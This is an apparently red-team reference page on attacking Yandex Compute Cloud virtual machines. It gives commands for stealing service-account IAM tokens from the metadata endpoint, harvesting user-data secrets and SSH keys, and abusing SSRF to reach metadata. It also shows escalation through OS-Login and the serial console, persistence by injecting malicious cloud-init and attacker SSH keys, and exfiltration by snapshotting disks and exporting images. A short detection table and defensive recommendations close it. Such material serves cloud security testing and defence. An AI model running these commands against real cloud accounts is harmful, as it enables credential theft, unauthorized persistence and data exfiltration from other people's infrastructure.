# Compute — Virtual Machines

## Overview

Yandex Compute Cloud provides VMs, disks, snapshots, and images. The metadata service, service account bindings, serial console, and OS-Login are the primary attack surfaces.

## Metadata Service (169.254.169.254)

The instance metadata service is accessible from any process on a VM. It uses the Google-compatible `Metadata-Flavor: Google` header.

### Token Theft

```bash
curl -s -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

Returns an IAM token for the bound service account.

### Full Metadata Enumeration

```bash
# Instance identity
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/hostname
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/id
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/zone

# Network
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/

# SSH keys
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys

# Cloud-init user-data (often contains secrets)
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/attributes/user-data
```

**`user-data` often contains:** setup scripts, database credentials, API keys, configuration secrets passed at VM creation time.

### SSRF to Metadata

Any SSRF vulnerability in an application running on a Compute VM can be used to hit `http://169.254.169.254` and steal the service account token. The only protection is the `Metadata-Flavor: Google` header requirement.

---

## Privilege Escalation

### Service Account Binding

VMs can have a service account bound at creation. Any process on the VM can use that SA's permissions via the metadata service. If the SA has overly broad roles, compromising the VM = compromising those roles.

### OS-Login to Root

With `compute.osLoginAdmin`:
```bash
yc compute ssh certificate export --organization-id <org-id>
ssh -i ~/cert/yc-org-id-<org-id>-<username> <username>@<vm-ip>
```

OS-Login does **not** restrict sudo. If the OS-Login user has sudo group membership on the VM → root access.

SSH certificates are valid for 1 hour.

### Serial Console Access

```bash
yc compute instance get-serial-port-output --id <instance-id>
```

Serial console output may contain: boot logs, kernel messages, login prompts, credentials, application output.

If serial console interactive access is enabled, direct console login is possible.

---

## Persistence

### Cloud-Init / User-Data Injection

```bash
yc compute instance update-metadata <instance-id> \
  --metadata-from-file user-data=malicious-cloud-init.yaml
```

Cloud-init scripts execute as **root** on every boot.

### SSH Key Injection via Metadata

```bash
yc compute instance update-metadata <instance-id> \
  --metadata "ssh-keys=attacker:ssh-rsa AAAA...attacker@host"
```

### OS-Login Profile Key Addition

Add SSH keys to OS-Login profiles stored in IAM. Keys persist across VM recreations and apply to all OS-Login-enabled VMs.

---

## Post-Exploitation

### Disk Snapshot and Analysis

```bash
yc compute snapshot create --name exfil-snap --disk-id <disk-id>
yc compute instance create --name analysis-vm \
  --create-boot-disk snapshot-id=<snapshot-id> \
  --service-account-id <sa-id>
```

Mount the snapshot as a secondary disk on an attacker-controlled VM for offline analysis.

### Image Extraction

```bash
yc compute image list --folder-id <folder-id>
yc compute image export --id <image-id> --destination-uri s3://<bucket>/image.qcow2
```

Custom images may contain hardcoded credentials, private keys, configuration.

---

## Enumeration

```bash
yc compute instance list --folder-id <folder-id>
yc compute instance get <instance-id>       # SA binding, network, metadata
yc compute disk list --folder-id <folder-id>
yc compute snapshot list --folder-id <folder-id>
yc compute image list --folder-id <folder-id>
```

---

## Detection

| Event | Audit Key |
|---|---|
| VM creation | `compute.instances.create` |
| Metadata update | `compute.instances.updateMetadata` |
| Snapshot creation | `compute.snapshots.create` |
| Serial console access | `compute.instances.getSerialPortOutput` |

## Defensive Recommendations

1. Bind minimum-privilege service accounts to VMs
2. Use OS-Login with short-lived certificates instead of static SSH keys
3. Audit `user-data` for credentials — use Lockbox references instead
4. Restrict serial console access
5. Monitor metadata update events in Audit Trails
